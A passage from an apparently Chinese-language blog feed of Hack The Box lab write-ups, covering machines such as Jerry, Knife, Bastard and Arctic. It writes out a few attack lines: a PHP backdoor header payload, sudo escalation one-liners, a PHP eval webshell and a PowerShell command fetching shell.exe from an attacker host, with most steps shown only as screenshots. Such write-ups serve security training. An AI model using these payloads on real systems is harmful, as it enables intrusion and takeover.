<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-jerry/image-20250216152859389.png" class="" title="Nmap">

<p>开放8080(tomcat)，直接访问可以发现tomcat 默认管理页面</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问目标，点击<code>Manager App</code> 在弹出的用户名密码界面，随便输入，就会跳转到403页面</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154248837.png" class="" title="tomcat管理页面">

<p>页面中出现用户名密码，使用tomcat:s3cret 登录，可以看到部署页</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154409280.png" class="" title="tomcat报错页面">

<p>使用msfvenom 生成后门，然后部署到tomcat， 点击应用名触发shell</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154608561.png" class="" title="生成后门">

<img src="/Hackthebox/htb/htb-jerry/image-20250216154519146.png" class="" title="部署war包">

<img src="/Hackthebox/htb/htb-jerry/image-20250216155106484.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txt’</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txt’</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>配置错误</tag>
        <tag>密码硬编码</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blue</title>
    <url>/Hackthebox/htb/htb-blue/</url>
    <content><![CDATA[<style>.hylpozudsehk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="hylpozudsehk">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-blue/image-20250216114713990.png" class="" title="Nmap">

<p>一个开放了445端口的Win7，直接尝试使用ms17-010 攻击目标</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块进行攻击</p>
<img src="/Hackthebox/htb/htb-blue/image-20250216120342061.png" class="" title="永恒之蓝">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\haris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>永恒之蓝</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Knife</title>
    <url>/Hackthebox/htb/htb-knife/</url>
    <content><![CDATA[<style>.ccmpzlulwohd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="ccmpzlulwohd">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-knife/image-20250216104801646.png" class="" title="Nmap">

<p>开放了22(SSH)和80(HTTP)</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb获取web指纹 PHP 8.1.0-dev ，Google一下，存在一个后门</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216104951989.png" class="" title="whatweb">

<img src="/Hackthebox/htb/htb-knife/image-20250216110740874.png" class="" title="image-20250216110740874">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>抓包，使用payload <code>User-Agentt: zerodiumsystem(&quot;id&quot;);</code></p>
<img src="/Hackthebox/htb/htb-knife/image-20250216110553497.png" class="" title="后门">

<p>直接反弹shell</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111124234.png" class="" title="反弹shell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 查看有哪些可以利用的点，找到一个knife</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111432749.png" class="" title="提权">

<p>运行一下knife，发现可以执行命令</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112140995.png" class="" title="knife">

<p>使用<code>sudo knife exec --exec &quot;exec &#39;/bin/sh -i &#39;&quot;</code> 成功提权</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112920949.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;james&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Shocker</title>
    <url>/Hackthebox/htb/htb-shocker/</url>
    <content><![CDATA[<style>.yppsulsxxpbc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="yppsulsxxpbc">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-shocker/image-20250216093127462.png" class="" title="Nmap">

<p>开放了80(HTTP) 和2222(SSH)</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>使用dirb进行目录猜解，发现 <code>/cgi-bin/</code>目录</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095828722.png" class="" title="dirb">

<p>然后使用Fuff 继续猜解，找到一个 <code>user.sh</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095724470.png" class="" title="Fuff">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> 模块</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216101417329.png" class="" title="GetShell">



<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 发现可以利用perl 进行提权 <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216103049798.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;shelly&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>Shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Tenten</title>
    <url>/Hackthebox/htb/htb-tenten/</url>
    <content><![CDATA[<style>.kwthkloxpunf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="kwthkloxpunf">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><img src="/Hackthebox/htb/htb-tenten/image-20250215132349182.png" class="" title="Nmap">

<p>开放了80端口，添加域名解析到hosts文件</p>
<pre class="language-none"><code class="language-none">$ echo &#39;10.10.10.10 tenten.htb&#39; | sudo tee -a &#x2F;etc&#x2F;hosts</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb识别站点指纹，目标为WordPress</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215132915851.png" class="" title="whatweb">

<p>点开文章，获得一个用户名(takis)，备用</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151109164.png" class="" title="信息收集">

<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>根据获取到的指纹，使用wpscan进行扫描，新版wpscan 要想获得漏洞信息，需要在官网注册账号，然后指定apk-token</p>
<pre class="language-none"><code class="language-none">wpscan  --url tenten.htb  --api-token WRH0ACCYJIBtqTKdxxxxxxxxxxLy1ZWzsAcxa8fA3s4</code></pre>

<img src="/Hackthebox/htb/htb-tenten/image-20250215144154195.png" class="" title="漏洞扫描">

<p>通过Fuzz 可以找到一个<code>/index.php/jobs/apply/13/</code>页面获取到标题</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215143621824.png" class="" title="信息收集">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在github可以找到一个CVE-2015-6668的Python2脚本，需要将脚本语法改成Python3</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215144333970.png" class="" title="漏洞利用">

<p>这张图片被隐写了信息，可以使用<code>steghide</code> 进行提取</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215145349051.png" class="" title="提取信息">

<p>使用<code>john</code>进行密码破解</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151629727.png" class="" title="破解密码">

<p>修改 <code>id_rsa</code> 权限，然后使用最开始收集到的用户名和破解出来的密码进行ssh 登录</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151534084.png" class="" title="Getshell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 发现一个脚本，直接运行脚本即可提权</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215152404422.png" class="" title="信息收集">

<img src="/Hackthebox/htb/htb-tenten/image-20250215152228863.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;takis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Bastard</title>
    <url>/Hackthebox/htb/htb-bastard/</url>
    <content><![CDATA[<style>.tyquejlxpifs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="tyquejlxpifs">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-bastard/image-20250215103413869.png" class="" title="Nmap">

<p>开放80、135和49154端口，并且80端口发现一些目录和文件，添加域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.9 bastard.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问 <code>/CHANGELOG.txt</code> 发现 CMS 为 <code>Drupal 7.54</code> </p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215105400323.png" class="" title="信息收集">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索可用exp</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215112934416.png" class="" title="searchsploit">

<p> 修改脚本，并使用payload <code>&#39;data&#39; =&gt; &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code> ，运行脚本</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125354575.png" class="" title="修改脚本">

<img src="/Hackthebox/htb/htb-bastard/image-20250215114456579.png" class="" title="exp">

<p>配置蚁剑，连接webshell</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125510849.png" class="" title="连接webshell">

<p>将webshell转换为msfconsole，先生成exe 然后使用蚁剑上传并执行exe</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122000088.png" class="" title="生成payload">

<img src="/Hackthebox/htb/htb-bastard/image-20250215125046135.png" class="" title="上传exe并执行">

<img src="/Hackthebox/htb/htb-bastard/image-20250215122253560.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 脚本进行信息收集</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122221334.png" class="" title="收集提权信息">

<p>使用 <code>exploit/windows/local/ms15_051_client_copy_image</code> 进行权限提升</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122939518.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\dimitris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Granny</title>
    <url>/Hackthebox/htb/htb-granny/</url>
    <content><![CDATA[<style>.mishepvxoqch{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="mishepvxoqch">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-granny/image-20250212204730377.png" class="" title="Nmap">

<p>开放80(IIS 6.0) 端口并且开启了webdav</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msf <code>windows/iis/iis_webdav_upload_asp</code> 模块进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210017947.png" class="" title="GetShell">

<p>迁移进程</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210739530.png" class="" title="进程">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 模块进行信息收集</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212205939579.png" class="" title="信息收集">

<p>使用ms15-051 进行提权</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210630257.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\Lakis\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>配置错误</tag>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Grandpa</title>
    <url>/Hackthebox/htb/htb-grandpa/</url>
    <content><![CDATA[<style>.bmgujttjffmq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="bmgujttjffmq">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-grandpa/image-20250212200523195.png" class="" title="Nmap">

<p>发现80(IIS 6.0) 端口</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> 模块进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212201611096.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>local_exploit_suggester</code> 模块进行本地提权的信息收集  </p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202135579.png" class="" title="信息收集">

<p>使用  <code>windows/local/ms14_070_tcpip_ioctl</code> 进行权限提升，提权失败</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202811599.png" class="" title="提权">

<p>列出进程，迁移进程 <code>migrate 3100</code>，然后重新提权</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202917826.png" class="" title="进程">

<img src="/Hackthebox/htb/htb-grandpa/image-20250212203009824.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th>Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td align="left">C:\Documents and Settings\Harry\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Arctic</title>
    <url>/Hackthebox/htb/htb-arctic/</url>
    <content><![CDATA[<style>.okbrkcifjhdp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="okbrkcifjhdp">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-arctic/image-20250202222155508.png" class="" title="Nmap">

<p>访问10.10.10.11:8500，发现一个目录列表，找到一个后台页面 <code>/CFIDE/administrator</code> 可以看到版本是8</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203110808681.png" class="" title="目录列表">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit检索coldfusion 8 找到一个RCE，复制exp到当前目录</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111301420.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-arctic/image-20250203111746331.png" class="" title="复制文件到当前目录">

<p>修改exp里面的IP地址，然后执行脚本，成功获取到shell</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111813277.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看一下系统信息，Windows Server 2008 R2 x64 </p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203112144909.png" class="" title="信息收集">

<p>使用msf生成一个后门，利用获取到的shell 下载并执行</p>
<p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
<p>msfconsole获取shell成功</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203114209620.png" class="" title="GetShell">

<p>使用msf的ms10-092 脚本进行提权，提示报错需要x64 的meterpreter</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132850659.png" class="" title="报错">

<p>查找x64 的进程进行迁移</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132941496.png" class="" title="查看进程">

<p>迁移成功，重新执行提权脚本，成功提权</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203133216230.png" class="" title="迁移进程">

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>C:\Users\tolis\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Legacy</title>
    <url>/Hackthebox/htb/htb-legacy/</url>
    <content><![CDATA[<style>.yjkpeitlhpey{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="yjkpeitlhpey">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-legacy/image-20250201192659015.png" class="" title="Nmap">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一个开了445端口的Windows XP，可以试试ms08067</p>
<img src="/Hackthebox/htb/htb-legacy/image-20250201193355321.png" class="" title="msfconsole">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\john\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Devel</title>
    <url>/Hackthebox/htb/htb-devel/</url>
    <content><![CDATA[<style>.atqadolrhknu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="atqadolrhknu">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">

<p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
<style>.czsuowchhjnc{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="czsuowchhjnc" alt="登录FTP">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">

<img src="/Hackthebox/htb/htb-devel/image-20250201215437794.png" class="" title="上传FTP成功">

<p>访问webshell，成功接收到shell</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215830245.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看系统信息，是个win7，使用ms10-015，提权成功</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201220950888.png" class="" title="sysinfo">

<img src="/Hackthebox/htb/htb-devel/image-20250201220847566.png" class="" title="提权成功">

<table>
<thead>
<tr>
<th>flag</th>
<th>path</th>
</tr>
</thead>
<tbody><tr>
<td>flag1</td>
<td>C:\Users\babis\Desktop\user.txt</td>
</tr>
<tr>
<td>flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Lame</title>
    <url>/Hackthebox/htb/htb-lame/</url>
    <content><![CDATA[<style>.vdotnebyrtfu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="vdotnebyrtfu">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.enojixliastr{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="enojixliastr" alt="Nmap">

<p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
<style>.tctocwgtsuqg{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="tctocwgtsuqg" alt="msfconsole">

<img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-lame/image-20250201175515940.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;makis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Optimum</title>
    <url>/Hackthebox/htb/htb-optimum/</url>
    <content><![CDATA[<style>.tvwqmjorznul{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="tvwqmjorznul">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-optimum/image-20250202180408340.png" class="" title="nmap">

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问目标</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223205864.png" class="" title="获取版本信息">

<p>使用searchsploit 检索可利用漏洞，发现目标可能存在RCE</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223259584.png" class="" title="searchsploit">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223401263.png" class="" title="漏洞利用">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>post/multi/recon/local_exploit_suggester</code>检测下当前系统可利用的提权漏洞</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223426591.png" class="" title="收集信息">

<p>根据结果使用ms16_032 进行权限提升</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250202185340241.png" class="" title="提权">



<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\kostas\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Beep</title>
    <url>/Hackthebox/htb/htb-beep/</url>
    <content><![CDATA[<style>.ejuiqnhjhbip{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="ejuiqnhjhbip">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
